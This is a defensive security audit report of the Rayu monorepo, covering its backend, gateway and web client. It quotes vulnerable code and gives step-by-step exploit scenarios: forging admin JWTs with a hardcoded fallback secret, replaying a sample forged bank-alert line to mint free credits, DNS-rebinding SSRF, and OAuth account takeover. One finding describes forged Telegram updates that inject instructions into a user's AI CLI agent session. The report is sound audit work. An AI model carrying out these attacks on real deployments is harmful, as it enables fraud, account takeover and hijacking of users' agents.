# Rayu Monorepo — Security Audit Report

**Type:** Authorized defensive security audit (read-only). No source file was modified.
**Date:** 2026-08-01
**Scope:** `rayu/` (CLI), `rayu-backend/` (NestJS+Prisma+MySQL), `rayu-gateway/` (Go+chi+Redis), `rayu-web/` (Next.js 15 + NextAuth), `deploy/`
**Plan:** `.rayu/plans/security-audit-monorepo.md`
**Raw per-track evidence:** `.rayu/audit/{backend,gateway,web,cli}-findings.md`

---

## 1. Executive Summary

### Counts by severity

| Severity | Count | IDs |
|---|---|---|
| **Critical** | 2 | BE-001, BE-002 |
| **High** | 3 | BE-003, BE-004, CLI-101 |
| **Medium** | 11 | BE-005, BE-006, BE-007, BE-014, GW-001, GW-002, WEB-001, WEB-002, CLI-001, DEP-001, XC-001 |
| **Low** | 17 | BE-009, BE-010, BE-011, BE-015, GW-004, GW-005, WEB-003, WEB-004, WEB-005, WEB-007, CLI-002, CLI-102, CLI-103, DEP-002, DEP-003, DEP-004, DEP-005 |
| **Informational** | 8 | BE-012, BE-013, WEB-008, WEB-009, GW-I01, GW-I02, GW-I03, GW-I04 |
| **Total** | **41** | |

### Top 5 risks

1. **BE-001 (Critical) — Free credits/plans via forged ABA payment alerts.** Payment confirmation trusts *any* text matching a regex in a watched Telegram group. No sender verification, no `trxId` replay protection, amount-only matching. One captured alert is replayable indefinitely. **Direct fund loss.**
2. **BE-002 (Critical) — JWT secret falls back to the hardcoded string `dev-only-insecure-secret`** when `RAYU_JWT_SECRET` is unset, with no startup guard. Anyone can forge an admin session token. The gateway shares this secret, so one misconfiguration compromises **both** services.
3. **CLI-101 (High) — Repo-driven RCE in non-interactive mode.** `.rayu/settings.json` hooks from an untrusted repo execute via `spawn(cmd, [], {shell:true})` with the workspace-trust gate explicitly bypassed when the session is non-interactive (`rayu -p`, SDK, CI).
4. **BE-003 (High) — Google ID-token `aud` check is skipped** when `GOOGLE_CLIENT_ID` is unset. Combined with email-based account linking (BE-011), an ID token minted for an attacker's own OAuth client yields the victim's Rayu session.
5. **BE-004 (High) — Telegram webhook authentication fails open** when `TELEGRAM_WEBHOOK_SECRET` is unset, allowing forged updates to be injected into a victim's linked CLI session.

### Blast-radius summary

- **Shared `RAYU_JWT_SECRET`** (backend ⇄ gateway) is the highest-value secret: it mints sessions the gateway honours for paid inference. BE-002 and XC-001 both threaten it.
- **Shared `RAYU_PROVIDER_SECRET`** is the AES-256-GCM master key for every stored provider API key. Its disclosure (XC-001) defeats the at-rest encryption design entirely, and rotating it requires re-entering every provider key.
- **A pattern of fail-open configuration guards is the dominant theme.** BE-002 (secret), BE-003 (`aud`), BE-004 (webhook secret) each degrade silently to "no security" when an env var is absent. None fails closed at boot.
- **The gateway is the strongest component** (atomic Redis Lua credit accounting, HMAC-pinned JWT parsing, parameterized SQL, sanitized error relay, non-root container). The **CLI permission engine is also genuinely hardened**; its weaknesses sit at the non-interactive boundary, not in the rule engine.
- **rayu-web is a thin client** with no privileged server route; all authorization is delegated to the backend. Its findings are credential handling (tokens in `localStorage`) and missing hardening headers, not access control.
- **No secret is committed to git.** All five `.env` files are untracked and every `.env.example` holds placeholders — but each `.env` is mode `664`, group/world readable on this host (XC-001).

---

## 2. rayu-backend findings

### BE-001 — ABA credit-alert payment confirmation trusts unauthenticated group text and has no replay protection

- **Severity:** Critical · **CWE-345** (Insufficient Verification of Data Authenticity), **CWE-294** (Capture-Replay), **CWE-799**
- **Confidence:** Confirmed (code gaps verified personally); real-world exploitability depends on Telegram group posting policy
- **Untrusted input:** text of any Telegram message seen by the MTProto userbot in `ABA_TELEGRAM_GROUP_ID`
- **Sink:** `PaymentsService.activatePaid()` → subscription activation + `creditTopup` grant

The listener never checks **who** sent the message, and its channel filter fails open when `chatId` is null:

`rayu-backend/src/payments/aba-telegram.listener.ts:116-127`
```ts
    if (!text) return
    if (expectedChatId && chatId && chatId !== expectedChatId) return

    const parsed = this.aba.parseAbaNotification(text)
    if (!parsed) return
    try {
      const confirmed = await this.payments.confirmAbaPaymentByAmount(
        parsed.amount,
        parsed.trxId,
      )
```

Matching is by **amount only**, against the most recent pending ABA payment, with no check that `trxId` was seen before:

`rayu-backend/src/payments/payments.service.ts:544-557`
```ts
    const amountCents = Math.round(amountUsd * 100)
    const payment = await this.prisma.payment.findFirst({
      where: { provider: 'aba', status: 'pending', amountCents,
        expiresAt: { gte: new Date(Date.now() - ABA_MATCH_GRACE_MS) } },
      include: { plan: true },
      orderBy: { createdAt: 'desc' },
    })
    if (!payment) return false
    await this.activatePaid(payment, ref ?? null)
```

The trx id is persisted only as `externalRef`, which is **not unique**, so the database imposes no idempotency:

`rayu-backend/prisma/schema.prisma:99-100`
```prisma
  externalRef   String?   @db.VarChar(191)
  md5           String?   @unique @db.VarChar(64)
```

**Description.** ABA offers no payment API, so a charge is marked `paid` purely because a line matching `parseAbaNotification`'s regex appeared in the watched group. Three independent controls are missing: (a) no sender verification — `senderId`/`fromId` is never inspected against ABA's bot; (b) no replay/idempotency key on `trxId`; (c) amount-only matching with no binding to the payer or the specific bill.

**Exploit scenario.**
1. Attacker creates a genuine pending purchase (`POST /api/payments/khqr`) and reads back the exact `amountCents`.
2. Attacker posts `$X.00 paid by AAA (*123) Trx. ID: 999999` into the ABA group (or delivers it through the null-`chatId` fail-open path).
3. `confirmAbaPaymentByAmount` matches the attacker's own pending payment → `activatePaid` grants the plan/credits with $0 paid.
4. Re-posting the same line confirms every future same-amount pending payment, because `trxId` is never deduplicated.

Amount-only matching additionally lets a genuine alert for user A's $5 payment confirm attacker B's *more recent* $5 pending payment (cross-user hijack).

**Impact.** Direct fund loss: unlimited free plan activation and credit minting; one captured alert is replayable indefinitely.

**Fix recommendation.** Verify the MTProto message sender is ABA's bot id (not merely the chat) and drop the message otherwise. Persist `trxId` as a unique idempotency key *before* activation so one alert confirms at most one payment. Bind confirmation to a specific payment reference instead of matching on amount. Do not fail open when `chatId` cannot be resolved.

**Notes.** Source comments acknowledge this trust model ("group posting must be locked down"), which means the only real control is Telegram group admin configuration — external to the code and invisible to it.

---

### BE-002 — JWT signing secret silently falls back to a hardcoded value

- **Severity:** Critical · **CWE-321** (Hard-coded Cryptographic Key), **CWE-798** · **Confidence:** Confirmed
- **Untrusted input:** `Authorization: Bearer <token>` on every guarded route · **Sink:** `JwtService.sign/verify`

`rayu-backend/src/config/configuration.ts:51-53`
```ts
      jwtSecret:
        process.env.RAYU_JWT_SECRET ??
        (isTest ? 'test-only-insecure-secret' : 'dev-only-insecure-secret'),
```

I grepped all of `src/` for consumers and startup validation: the value is consumed at exactly one site (`src/auth/auth.module.ts:25`, `secret: config.get<string>('app.jwtSecret')`) and **no file throws or refuses to boot** when the env var is missing.

**Description.** If `RAYU_JWT_SECRET` is unset in a non-test process, the backend signs *and verifies* session tokens with a constant published in the source tree. `RayuAuthGuard` accepts any token that verifies against it.

**Exploit scenario.** Against a deployment that forgot the variable, an attacker signs `{"sub":<admin id>,"type":"access"}` with HS256 and the known secret and sends it as a Bearer token. `resolveAccessToken` loads that user from the DB, so choosing an existing admin's `sub` grants full `/api/admin/*` access. Because `deploy/docker-compose.yml` feeds the same variable to the gateway, the forged token is also honoured for paid inference.

**Impact.** Complete authentication and authorization bypass; admin takeover; credit theft.

**Fix recommendation.** Fail closed — refuse to boot in non-test environments when `RAYU_JWT_SECRET` is unset or below a minimum length/entropy, and reject the `.env.example` placeholder literal. Never ship a usable default.

---

### BE-003 — Google ID-token audience check is skipped when `GOOGLE_CLIENT_ID` is unset

- **Severity:** High · **CWE-287** · **Confidence:** Confirmed (fail-open code); Likely for full takeover chained with BE-011
- **Untrusted input:** `idToken` on `/api/auth/oauth/google`, `/api/web/session`, `/api/cli/exchange` · **Sink:** session issuance

`rayu-backend/src/auth/oauth.service.ts:55-57`
```ts
    if (this.googleClientId && data.aud !== this.googleClientId) {
      throw new UnauthorizedException('Google token audience mismatch')
    }
```

**Description.** Audience binding is enforced only when `this.googleClientId` is truthy. With the variable unset, any signature-valid, unexpired Google ID token is accepted — including one minted for an unrelated OAuth client. Identity is keyed on the token's `sub`/`email`, and `upsertFromOAuth` links by email (BE-011). The expiry check on the following lines is also conditional (`if (data.exp && ...)`), though Google always populates `exp`.

**Exploit scenario.** With `GOOGLE_CLIENT_ID` unset, the attacker registers their own Google OAuth app and induces the victim to sign in to it (or reuses any ID token the victim's browser grants to an attacker-controlled `client_id`). The token carries the victim's real `sub`/`email`; the attacker POSTs it to `/api/auth/oauth/google`, it verifies with no `aud` check, and email linking returns Rayu tokens for the victim's account.

**Impact.** Account takeover for any Google-identified user.

**Fix recommendation.** Require `GOOGLE_CLIENT_ID` at boot and always validate `aud` and `iss`; make the `exp` check unconditional. Treat missing configuration as fatal, never as "accept any audience".

---

### BE-004 — Telegram webhook secret check fails open when the secret is unset

- **Severity:** High (in webhook deployments; precondition-gated) · **CWE-306** · **Confidence:** Confirmed (fail-open code); Likely end-to-end (needs a target `chatId`)
- **Untrusted input:** public `POST /api/telegram/webhook` body · **Sink:** `handleUpdate` → per-user inbound queue / link mutations

`rayu-backend/src/telegram/telegram.service.ts:425-428`
```ts
  /** Validate the secret token Telegram sends in webhook requests. */
  validateWebhookSecret(headerValue: string | undefined): boolean {
    if (!this.webhookSecret) return true
    if (!headerValue) return false
```

**Description.** When `TELEGRAM_WEBHOOK_SECRET` is empty the function returns `true` for every request, so the public webhook accepts arbitrary attacker-crafted `update` objects. When the secret *is* set the comparison is correct and length-checked.

**Exploit scenario.** With webhook mode enabled and the secret omitted, an attacker POSTs a forged update. `handleUpdate` routes by `chat.id`: for a `chatId` already linked to a victim, a plain-text message is enqueued into that victim's `TelegramInbound` queue and the CLI consumes it **as if the user typed it** — remote prompt injection into an authenticated agent session. A forged `/disconnect` unlinks the victim.

**Impact.** Unauthenticated injection of instructions into another user's CLI session; link tampering.

**Fix recommendation.** Fail closed: if `TELEGRAM_WEBHOOK_URL` is configured, require a non-empty secret at boot and return `false` when no secret is set.

**Notes.** Dormant in the audited config (`TELEGRAM_WEBHOOK_URL` unset → polling path), but `.env.example` calls webhook mode "recommended for production" while marking the secret "Optional".

---

### BE-005 — No rate limiting or lockout on authentication endpoints, including `/admin-login`

- **Severity:** Medium (High if `LOCAL_ADMIN_PASSWORD` is weak) · **CWE-307** · **Confidence:** Confirmed

`rayu-backend/src/auth/auth.controller.ts:106-111`
```ts
  @Post('admin-login')
  adminLogin(
    @Body() body: LocalLoginDto,
  ): Promise<RayuTokens & { user: PublicUser }> {
    return this.auth.localAdminLogin(body.email, body.password)
  }
```

Grepping `src/` for `Throttle|ThrottlerModule|rateLimit` returns only comments, and `main.ts` installs no rate-limiting middleware. I also confirmed there is **no compensating control at the edge** — `deploy/Caddyfile` contains no `rate_limit` directive.

**Description.** The local admin account has a fixed, guessable email (`admin@rayucode.com`) and no per-IP or per-account throttle, lockout, backoff, or CAPTCHA exists on any auth route. Password comparison itself is sound (scrypt + `timingSafeEqual`) and the password is not logged, so throttling is the single missing control.

**Exploit scenario.** Unbounded online dictionary attack against `POST /api/admin-login` with the known admin email. `/auth/register` and `/auth/login` are likewise open to account spam and credential stuffing, with user enumeration available by timing (a missing user skips scrypt).

**Impact.** Admin compromise if the password is weak; resource abuse; user enumeration.

**Fix recommendation.** Per-IP and per-account throttling with exponential backoff on all auth routes, plus a constant-work path for unknown users. Add `rate_limit` at the Caddy edge as defense in depth.

---

### BE-006 — Refresh tokens are stateless with no rotation, reuse detection, or revocation

- **Severity:** Medium · **CWE-613** · **Confidence:** Confirmed

`rayu-backend/src/auth/auth.service.ts:155-167` verifies the refresh JWT and mints new tokens without invalidating the presented one; there is no `jti`, no server-side store, and no rotation.

**Description.** Refresh tokens are plain JWTs with a 30-day TTL (`RAYU_REFRESH_TTL=2592000`). The presented token remains valid until natural expiry, so it can be replayed repeatedly and cannot be revoked short of suspending the user or rotating `RAYU_JWT_SECRET` (which invalidates every session).

**Exploit scenario.** A refresh token captured from `localStorage` (WEB-001), a log, or a stolen `~/.rayu/rayu-auth.json` grants a 30-day renewable window with no revocation path.

**Impact.** Prolonged unauthorized access from one stolen token.

**Fix recommendation.** Rotate on every use, persist a token id/family, revoke the family on replay detection, and support explicit logout.

**Notes.** Partly mitigated: access-token authorization reloads the live user and role on every request, so suspension and demotion take effect immediately.

---

### BE-007 — Promo "first N accounts" cap has a TOCTOU race allowing oversell

- **Severity:** Medium · **CWE-362** · **Confidence:** Likely (depends on isolation level and concurrency)

`rayu-backend/src/promo/promo.service.ts:285-299`
```ts
      const promo = await tx.promoCode.findUnique({ where: { id: promoCodeId } })
      if (!promo) return
      if (promo.maxRedemptions != null && promo.usedCount >= promo.maxRedemptions) {
        throw new BadRequestException('This promo code has reached its usage limit')
      }
      await tx.promoCode.update({
        where: { id: promoCodeId },
        data: { usedCount: { increment: 1 } },
      })
```

**Description.** The cap re-check uses a non-locking `findUnique` inside the transaction. Under InnoDB REPEATABLE READ, two concurrent redemptions can both read `usedCount = N-1`, both pass the guard, then both increment — pushing `usedCount` past `maxRedemptions`. There is no `SELECT ... FOR UPDATE`. The `@@unique([promoCodeId, userId])` constraint prevents a single user double-redeeming, so the race is bounded to distinct users racing the final slots.

**Impact.** Limited over-redemption of capped promos; not unbounded.

**Fix recommendation.** Make the cap atomic — a conditional `UPDATE ... SET usedCount = usedCount + 1 WHERE id = ? AND (maxRedemptions IS NULL OR usedCount < maxRedemptions)`, treating 0 affected rows as "cap reached" — or lock the promo row `FOR UPDATE` before the check.

---

### BE-014 — ABA listener logs the full bank alert text (payer PII) at info level

- **Severity:** Medium · **CWE-532** (Sensitive Information in Log File), **CWE-359** · **Confidence:** Confirmed *(discovered during my own verification pass)*

`rayu-backend/src/payments/aba-telegram.listener.ts:112-114`
```ts
    this.logger.log(
      `ABA userbot received a message chatId=${chatId} expectedChatId=${expectedChatId} text=${JSON.stringify(text)}`,
    )
```

**Description.** Every message the userbot observes in the ABA group is logged verbatim at info level, before any filtering. ABA credit alerts contain the **payer's name, the last three digits of their card, the amount, and the transaction id** — exactly the fields `parseAbaNotification` extracts. Confirmation events are logged again with amount and `trxId`.

**Exploit scenario.** A standing exposure rather than an active attack: anyone with log read access (`docker logs`, a log aggregator, a support engineer, a leaked archive) obtains a continuous feed of customer payment records. It also reveals the exact amounts of in-flight pending payments, which is precisely the reconnaissance BE-001 requires.

**Impact.** Financial PII disclosure to anyone with log access; assists BE-001.

**Fix recommendation.** Remove the raw `text` from this log line, or emit it only behind a debug flag with payer name and card digits redacted. Log a non-identifying correlation value instead.

---

### BE-009 — Studio git-proxy forwards the inbound `Authorization` header to the upstream git host

- **Severity:** Low · **CWE-200** · **Confidence:** Likely

`rayu-backend/src/studio/studio-git-proxy.controller.ts` lists `'authorization'` in `FORWARD_REQUEST_HEADERS`, while the same route is `@UseGuards(RayuAuthGuard)` — a guard that authenticates using exactly that header. The value satisfying the guard is therefore copied into the upstream request.

**Description.** One header serves two purposes, so the caller's Rayu access JWT is transmitted to the destination git host (github.com / gitlab.com / bitbucket.org) and into its logs. The host is allow-listed to public git providers, so this is not internal SSRF — it is session-token disclosure to a third party that never needed it.

**Fix recommendation.** Strip `authorization` before forwarding and carry the git credential on a distinct mechanism.

---

### BE-010 — No security response headers (helmet not installed)

- **Severity:** Low · **CWE-693** · **Confidence:** Confirmed

`main.ts` configures body parsing, `ValidationPipe`, CORS, the global prefix and a logger, but installs no security-header middleware; grep for `helmet` finds nothing. Responses carry no HSTS, `X-Content-Type-Options`, framing controls, or `Referrer-Policy`. As a JSON API the exposure is limited, but `deploy/Caddyfile` sets no headers either (DEP-002), so no layer supplies them.

**Fix recommendation.** Add `helmet` with an API-appropriate policy, or set the headers at the proxy.

---

### BE-011 — OAuth account linking by email does not require a verified email

- **Severity:** Low (elevates BE-003) · **CWE-287** · **Confidence:** Confirmed

`rayu-backend/src/users/users.service.ts:52-55`
```ts
    if (!existing) {
      // If an email is provided, try to link to an existing user first.
      let user = profile.email ? await this.findByEmail(profile.email) : null
```

**Description.** A new OAuth identity links to any pre-existing account with the same email without checking `profile.emailVerified` (the flag is captured but never gated). For first-party Google tokens the email is normally provider-verified, so in isolation the risk is low — but this is the primitive that converts BE-003 into full account takeover, and it also merges an OAuth login into a *local* account whose `emailVerified` is false.

**Fix recommendation.** Link only when the incoming email is provider-verified, and require explicit user confirmation to merge a local account with an OAuth identity.

---

### BE-015 — `redeemCode` does not verify the `state` bound to the device code

- **Severity:** Low (defense-in-depth only — mitigated in the CLI) · **CWE-352** · **Confidence:** Confirmed *(finding and its mitigation both verified in my own pass)*

`rayu-backend/src/auth/auth.service.ts:139-145`
```ts
  async redeemCode(
    code: string,
  ): Promise<RayuTokens & { user: PublicUser }> {
    const redeemed = this.codes.consume(code)
    if (!redeemed) {
      throw new UnauthorizedException('Invalid or expired code')
    }
```

**Description.** `CodeStoreService` stores the CLI-generated `state` alongside each code and `consume()` returns it — but `redeemCode` ignores it, and `POST /api/cli/token` is unauthenticated. The server performs no CSRF binding on redemption.

**Why only Low — the CLI closes the gap** (verified): `rayu/src/services/rayuAuth/rayuLogin.ts:119` rejects a callback whose state does not match the one it generated (`if (gotState !== state)`), the listener binds to loopback only (`server.listen(0, '127.0.0.1', ...)`, `rayuLogin.ts:106`), and the state is 128-bit. An attacker therefore cannot inject a foreign code into a victim's CLI. This resolves the open cross-component question raised in WEB-008.

**Fix recommendation.** Have `/cli/token` require and compare `state` too, so the binding does not depend solely on client-side enforcement.

---

### BE-012 — Informational: `$queryRawUnsafe` in analytics interpolates a clamped integer (reviewed, **not** injectable)

Recorded to close the SQL-injection requirement explicitly. The only raw SQL in the service tree is four call sites in `src/admin/admin.service.ts`: two `$queryRaw` tagged templates with no user input, and two `$queryRawUnsafe` calls interpolating `win`, sanitized to an integer in [7,90] via `Math.min(90, Math.max(7, Math.floor(days) || 30))` from an admin-guarded `@Query('days')`. No attacker-controlled string reaches SQL. **Conclusion: no SQL injection in the backend.** The recommendation is stylistic — prefer a bound parameter so the "no interpolation into `Unsafe`" invariant remains mechanically checkable.

### BE-013 — Informational: top-up `credits → amountCents` can overflow the 32-bit column at extreme inputs

`create-topup.dto.ts` permits `credits` up to `100_000_000`, while `Payment.amountCents` / `CreditTopup.amountCents` are Prisma `Int` (32-bit). With a small admin `creditsPerDollar`, `Math.ceil((credits / creditsPerDollar) * 100)` can exceed 2,147,483,647 and fail the INSERT. No fund loss (credits are granted only on confirmed payment), but the caller receives an unhandled DB error instead of a clean 400. Bound `amountCents` explicitly.

---

## 3. rayu-gateway findings

No Critical or High finding was confirmed. The gateway is the most defensively mature component in the monorepo (see Positive Findings).

### GW-001 — Authenticated SSRF on `/v1/proxy`: DNS-rebinding TOCTOU and no upstream allow-list

- **Severity:** Medium · **CWE-918** (SSRF), **CWE-441** (Confused Deputy), **CWE-367** (TOCTOU)
- **Confidence:** Confirmed for the code facts (verified personally); Medium on real-world exfiltration
- **Untrusted input:** `X-Rayu-Upstream-URL` header from any user holding a valid access token · **Sink:** `proxy.Forward` dial

`/v1/proxy` is registered **outside** the Bearer-auth group and self-authenticates, so it is reachable by any valid token — it is not admin-gated:

`rayu-gateway/internal/server/server.go:167`
```go
	r.HandleFunc("/v1/proxy", s.handleProxy)
```

The client-controlled target is guarded only by `validateUpstreamURL`:

`rayu-gateway/internal/server/server.go:1294-1302`
```go
var validateUpstreamURL = func(raw string) error {
	u, err := url.Parse(raw)
	if err != nil {
		return errors.New("invalid upstream url")
	}
	if u.Scheme != "https" {
		return errors.New("upstream must be https")
	}
	host := u.Hostname()
```

which resolves DNS **at validation time**:

`rayu-gateway/internal/server/server.go:1319-1322`
```go
	// Hostname: resolve and reject if any A/AAAA record is private.
	ips, err := net.LookupIP(host)
	if err != nil {
		return false // let the forward attempt fail naturally if it won't resolve
```

The request is then dialed by a **separate, second** resolution inside the transport:

`rayu-gateway/internal/server/server.go:1024`
```go
	status, wrote, ferr := proxy.Forward(r.Context(), w, r.Method, upstream, forwardableHeaders(r.Header), body)
```

**Description and bypass.** Two independent DNS lookups create a classic rebinding TOCTOU: an attacker controlling DNS for a hostname with a low TTL returns a public IP for the validation lookup and a private/loopback address for the connection. Separately there is **no allow-list**, so any authenticated user can relay arbitrary requests to any public HTTPS host — an authenticated open forward proxy originating from Rayu's egress IPs, with `r.Method` and body forwarded verbatim.

I also confirmed the private-range check is **weaker than the hosted-path equivalent** — it omits CGNAT (100.64.0.0/10) and general multicast that `providercfg.IsPrivateIP` covers:

`rayu-gateway/internal/server/server.go:1332-1334`
```go
func isPrivateIP(ip net.IP) bool {
	return ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() ||
		ip.IsLinkLocalMulticast() || ip.IsUnspecified()
```

**Impact.** Blind SSRF from the gateway's network position (internal port/endpoint probing, state-changing internal POSTs) and abuse of Rayu as an authenticated relay.

**Why Medium, not High.** The URL is forced to `https` and Go verifies TLS by default, so an internal host presenting a non-matching certificate fails the handshake and returns no readable body. Plaintext metadata endpoints (AWS/GCP/Azure IMDS over HTTP) are therefore unreachable. This is the single control keeping the finding out of High.

**Fix recommendation.** Resolve once and pin the connection to the validated IP via a custom `DialContext` that re-checks the resolved address at dial time, eliminating the second lookup. Align `isPrivateIP` with `providercfg.IsPrivateIP` (add CGNAT and multicast). Reject URLs containing userinfo. Consider an explicit allow-list of legitimate provider hosts for the BYO path.

**Notes.** The hosted path is **not** affected: its upstream URL is built solely from the admin-controlled provider row plus `UpstreamModelID`.

---

### GW-002 — Unbounded buffering of upstream provider responses (non-streaming) → memory-exhaustion DoS

- **Severity:** Medium · **CWE-400**, **CWE-770** · **Confidence:** High on the code fact; Medium on likelihood

The non-streaming `Complete` path of every translating adapter reads the whole upstream body with no limit:

`rayu-gateway/internal/proxy/anthropic.go:272`, `internal/translate/openai_chat.go:525`, `internal/translate/openai_responses.go:487`, `internal/translate/genai.go:621`
```go
	respBody, _ = io.ReadAll(resp.Body)
```

That this is an oversight rather than a decision is evident from the Bedrock adapter, which caps the identical read:

`rayu-gateway/internal/translate/bedrock.go:49` and `:207`
```go
const maxUpstreamBody = 8 << 20 // 8 MiB
	respBody, err := io.ReadAll(io.LimitReader(resp.Body, maxUpstreamBody))
```

**Description.** Upstream provider responses are an untrusted boundary. A compromised, buggy, or MITM'd upstream returning a multi-gigabyte body on a non-streaming request is buffered entirely in memory. Concurrent `Complete` calls multiply it, and the global in-flight valve is off by default (GW-I02).

**Impact.** Process-wide availability loss triggered by upstream behaviour rather than client rate.

**Fix recommendation.** Wrap each `Complete` read in `io.LimitReader` using the existing 8 MiB constant and treat truncation as a provider error. Also bound the verbatim `bufio.Reader.ReadBytes('\n')` growth in `StreamAnthropic` the way `sse.go` already does with `maxSSELineBytes`.

**Notes.** The BYO `/v1/proxy` path is unaffected — `proxy.Forward` streams in 32 KiB chunks.

---

### GW-004 — JWT expiry not required, and `role` trusted from claims with no DB re-check or revocation

- **Severity:** Low · **CWE-613**, **CWE-863** · **Confidence:** High on code facts

`rayu-gateway/internal/auth/jwt.go:30-35`
```go
	parsed, err := jwt.Parse(tokenStr, func(t *jwt.Token) (interface{}, error) {
		if _, ok := t.Method.(*jwt.SigningMethodHMAC); !ok {
			return nil, fmt.Errorf("unexpected signing method: %v", t.Header["alg"])
		}
		return []byte(secret), nil
	}, jwt.WithValidMethods([]string{"HS256"}))
```

Admin gating consumes the claim verbatim, e.g. `internal/server/server.go:281`:
```go
	if claims.Role != "admin" && claims.Role != "superadmin" {
```

**Description.** Two hardening gaps. (1) `exp` is validated only when present — there is no `jwt.WithExpirationRequired()`, so a token minted without `exp` never expires. (2) `role` comes straight from the signed token and is never re-validated against MySQL, and there is no `jti`/revocation check. Account *status* is re-checked on hosted paths (`ent.Active()`), but the admin role is not.

Not exploitable without the signing secret — the HMAC assertion plus `WithValidMethods` correctly block `alg=none` and RS256→HMAC confusion. The consequence is lost defense-in-depth: a demoted admin retains gateway admin until token expiry, and if `RAYU_JWT_SECRET` leaks (XC-001, BE-002) a forged admin token may never expire.

**Fix recommendation.** Add `jwt.WithExpirationRequired()`, enforce a maximum token age, re-check role/status against the DB (or a short-TTL cache) for admin-only endpoints, and support revocation.

---

### GW-005 — Client-controlled Redis key segment via `X-Rayu-Logical-Request-Id`

- **Severity:** Low · **CWE-99** · **Confidence:** High on construction; low impact by design

`rayu-gateway/internal/server/server.go:918` and `internal/credits/limiter.go:319`
```go
	logicalID := headerOr(r, "X-Rayu-Logical-Request-Id", reqID)
	return "turnhold:" + strconv.FormatInt(uid, 10) + ":" + logicalID
```

**Description.** The client-supplied header is concatenated into a Redis key with no length or charset validation. It is prefixed with the caller's own numeric `uid` and a fixed `turnhold:` family, so it **cannot** collide with another user's namespace or become a different key family. The only effect is many distinct short-lived keys inside the caller's own namespace, bounded by request volume.

**Fix recommendation.** Cap the length and restrict the charset, or hash the value before use in a key.

---

### Gateway informational notes

- **GW-I01 — Circuit breaker shared across trust boundaries.** `proxy.Breakers` (proxy.go:69) is package-level and keyed only by upstream host, shared between the untrusted `/v1/proxy` path and the hosted path. Not demonstrably exploitable: only transport errors and exhausted-retry 502/503/504 count as failures (`isRetryableStatus` excludes 401/403/429), so a BYO caller using a valid key receives normal 2xx/4xx. Per the audit's own rule (guard present, bypass not demonstrated) this stays Informational. Consider namespacing breaker keys by trust class.
- **GW-I02 — No default global concurrency cap.** `RAYU_MAX_INFLIGHT` defaults to `0` = unlimited, so the process-wide load-shed valve is off unless configured. Per-user caps still bound a single user. This is what makes GW-002 worse than it would otherwise be.
- **GW-I03 — `/v1/proxy` upstream URL logged verbatim.** `validateUpstreamURL` does not reject userinfo or query strings, and `handleProxy` logs `upstream=%s`, so a BYO user who puts a key in the URL logs their own credential. The hosted-path validator (`providercfg.ValidateBaseURL`) rejects userinfo — align them.
- **GW-I04 — GenAI URL model substitution is not path-escaped.** `genAIEndpoint` (genai.go:95) uses `strings.ReplaceAll(path, "{model}", model)` without `url.PathEscape`, unlike Bedrock's `EndpointFor`. `model` is the admin-controlled `UpstreamModelID`, so this is defense-in-depth only.

---

## 4. rayu-web findings

rayu-web is a **thin client**: the only server route is NextAuth (`app/api/auth/[...nextauth]/route.ts`). Every protected page is a `'use client'` component that calls rayu-backend/rayu-gateway with a bearer token, so all authorization is delegated. There is consequently no server-rendered sensitive data and no privileged web API route to attack. No XSS sink, no open redirect, and no client-controlled price was found.

### WEB-001 — Rayu access **and 30-day refresh** tokens persisted in `localStorage`

- **Severity:** Medium (escalates to High/Critical if any XSS is introduced) · **CWE-522**, **CWE-539** / OWASP A07:2021 · **Confidence:** High

`rayu-web/lib/useRayuToken.ts:44` and `app/admin/AdminProvider.tsx:50,79`
```ts
function writeStoredSession(s: RayuSession): void {
  if (typeof window === 'undefined') return
  localStorage.setItem(RAYU_SESSION_KEY, JSON.stringify(s))
```

**Description.** The full backend session — `accessToken`, the 30-day `refreshToken`, and `user.role` — is written to `localStorage` under `rayu_session` (users) and `rayu_admin_session` (admins). `localStorage` is readable by any JavaScript on the origin and survives tab close.

**Exploit scenario.** Any script-execution foothold (a future XSS, a compromised client-bundle dependency, a malicious browser extension) reads both keys and exfiltrates the refresh token, granting ~30 days of silent re-authentication via `POST /cli/refresh` — which per BE-006 cannot be revoked. Theft of `rayu_admin_session` yields an admin refresh token.

**Impact.** Long-lived account takeover on token theft; elevated takeover for the admin key.

**Fix recommendation.** Perform the token exchange server-side (Route Handler or Server Action) and set tokens as `HttpOnly; Secure; SameSite` cookies so client JS never holds the refresh token. Pair with a CSP (WEB-004) and backend rotation/revocation (BE-006).

**Notes.** No XSS sink exists in the app today, so this is a latent amplifier rather than an actively exploitable leak.

---

### WEB-002 — Google OIDC `id_token` exposed to client JavaScript via the NextAuth session

- **Severity:** Medium · **CWE-200**, **CWE-522** · **Confidence:** High

`rayu-web/auth.ts:89-92`
```ts
async session({ session, token }) {
  if ((token as any).idToken) {
    session.idToken = (token as any).idToken as string
  }
```

**Description.** The raw Google ID token is copied into the NextAuth `Session`, exposing it to `useSession()` and to `GET /api/auth/session`. That token is a bearer credential the backend accepts to mint a full Rayu session (`POST /auth/oauth/google`) and a CLI device code (`POST /cli/exchange`). The Google **refresh_token** is correctly kept server-side and never added to the session — only the ID token leaks.

**Exploit scenario.** Theft of the session (XSS reading `session.idToken`, or replay of the NextAuth session cookie against `/api/auth/session`) lets an attacker replay the ID token to `/auth/oauth/google` and obtain the victim's Rayu access and refresh tokens within its ~1h validity. Note this combines with BE-003: if `GOOGLE_CLIENT_ID` were unset, audience binding would not even constrain which client the token came from.

**Impact.** Account impersonation; widens the blast radius of any client-side compromise.

**Fix recommendation.** Do not place the raw ID token in the client-visible session. Exchange it server-side immediately after sign-in and store the resulting Rayu session in `HttpOnly` cookies; expose only non-sensitive profile fields.

---

### WEB-003 — No server-side authorization: middleware is a no-op; admin role gate is client-side only

- **Severity:** Low (defense-in-depth) · **CWE-602**, **CWE-284** / OWASP A01:2021 · **Confidence:** High

`rayu-web/middleware.ts:4-11`
```ts
export default auth((req) => {
  // Allow all public traffic; protected pages check auth themselves.
  return NextResponse.next()
})
```

The only role gate is client-side, `app/admin/AdminProvider.tsx:139-143`:
```ts
        const user = await validateToken(s.accessToken)
        if (user.role !== 'admin' && user.role !== 'superadmin') {
```

**Description.** The matcher covers nearly every route but the middleware enforces nothing, and no layout or page performs a server-side check. `/admin` is protected only by a client-side comparison.

**Bypass and why it is still only Low.** An attacker can trivially render the admin shell (patch the JS, or set `localStorage['rayu_admin_session']`), but this yields **no data**: every admin call carries a bearer token the backend must accept for `/admin/*`, and without a valid admin token the backend returns 401/403. The client gate is cosmetic and bypassing it discloses nothing by itself.

